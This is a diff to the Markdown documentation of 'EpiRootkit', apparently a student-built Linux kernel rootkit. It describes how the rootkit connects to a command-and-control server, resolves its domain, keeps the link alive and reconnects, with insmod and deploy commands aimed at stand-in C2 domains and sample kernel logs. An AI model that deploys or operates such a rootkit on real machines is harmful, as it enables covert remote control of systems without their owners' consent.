@@ -19,12 +19,12 @@ How EpiRootkit connects to the C2 server and handles authentication with **domai
 When the rootkit loads, it automatically:
 
 1. **Starts connection thread** (`epirootkit_conn`)
-2. **Resolves domain** (if address is domain name) using kernel DNS
+2. **Resolves domain** (if address is domain name) - see [DNS Resolution](./features/dns-resolution.md)
 3. **Attempts TCP connection** to configured C2 server
 4. **Begins keepalive system** (60-second ping/pong)
 5. **Handles reconnection** with exponential backoff
 
-### Configuration with Domain Support (🆕 Bonus Feature)
+### Configuration with Domain Support
 ```c
 // rootkit/core/config.h - Domain examples
 #define C2_SERVER_ADDRESS "jules-c2.example.com"  // Domain name
@@ -47,38 +47,10 @@ sudo ./deploy_rootkit.sh address=secure.company.net port=443
 sudo ./deploy_rootkit.sh address=10.0.0.100 port=8080
 ```
 
-## 🎯 DNS Resolution (Bonus Feature)
-
-### How DNS Resolution Works
-EpiRootkit includes a **kernel-space DNS resolver** for real rootkit behavior:
-
-1. **Address parsing**: Module detects if parameter is IP or domain
-2. **IP validation**: Uses `in4_pton()` to check IP format  
-3. **DNS query**: If domain, constructs UDP DNS packet
-4. **Google DNS**: Sends query to 8.8.8.8:53
-5. **Response parsing**: Extracts A record from DNS response
-6. **Connection**: Uses resolved IP for TCP connection
-
-### DNS Implementation Features
-- **Pure kernel implementation**: No userspace dependencies
-- **Google DNS**: Reliable 8.8.8.8 DNS server
-
-### DNS Resolution Example
-```bash
-# Module parameters with domain
-sudo insmod epirootkit.ko address=c2.malware-domain.com port=443
-
-# Kernel log output:
-# [2025-05-25 16:13:09] EpiRootkit: Attempting connection to c2.malware-domain.com:443
-# [2025-05-25 16:13:09] EpiRootkit: Resolving domain: c2.malware-domain.com
-# [2025-05-25 16:13:10] EpiRootkit: Resolved c2.malware-domain.com to 203.0.113.42
-# [2025-05-25 16:13:10] EpiRootkit: Connected to C2 server c2.malware-domain.com:443
-```
-
 ## Network Architecture
 
 ### Four-Layer System
-1. **DNS Resolution** (`dns_resolver.c`) - Domain name resolution
+1. **DNS Resolution** - See [DNS Resolution](./features/dns-resolution.md) for details
 2. **Connection Management** (`connection.c`) - High-level coordination
 3. **Keepalive System** (`keepalive.c`) - Health monitoring
 4. **Socket Management** (`socket.c`) - Low-level network operations
@@ -130,13 +102,7 @@ sudo insmod epirootkit.ko address=c2.test-domain.com port=4444
 [2025-05-25 16:13:09] Client-1 status: UNAUTHENTICATED
 ```
 
-**Kernel logs show DNS resolution:**
-```bash
-dmesg | tail -10
-# [2025-05-25 16:13:09] EpiRootkit: Resolving domain: c2.test-domain.com
-# [2025-05-25 16:13:09] EpiRootkit: Resolved c2.test-domain.com to 192.168.1.100
-# [2025-05-25 16:13:09] EpiRootkit: Connected to C2 server c2.test-domain.com:4444
-```
+For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).
 
 ### 3. Check Connection
 ```bash
@@ -191,18 +157,8 @@ c2-server$ keepalive Client-1
 ### Reconnection Process
 1. **Detect disconnection**
 2. **Wait with backoff**: 5s → 10s → 20s → 30s (max)
-3. **Attempt reconnection** (with DNS resolution if needed)
+3. **Attempt reconnection** (with DNS resolution if domain - see [DNS Resolution](./features/dns-resolution.md))
 4. **Reset authentication**: Must re-authenticate after reconnect
 5. **Resume operations**
 
-### DNS-Aware Reconnection
-```bash
-# If domain was used initially, DNS resolution happens on each reconnection
-# This allows for dynamic IP changes and failover scenarios
-
-# Kernel logs during reconnection:
-# [2025-05-25 16:20:00] EpiRootkit: Connection lost, attempting reconnection
-# [2025-05-25 16:20:05] EpiRootkit: Resolving domain: backup-c2.example.com
-# [2025-05-25 16:20:05] EpiRootkit: Resolved backup-c2.example.com to 203.0.113.100
-# [2025-05-25 16:20:05] EpiRootkit: Reconnected to C2 server backup-c2.example.com:443
-```
+For DNS-aware reconnection details, see [DNS Resolution](./features/dns-resolution.md).
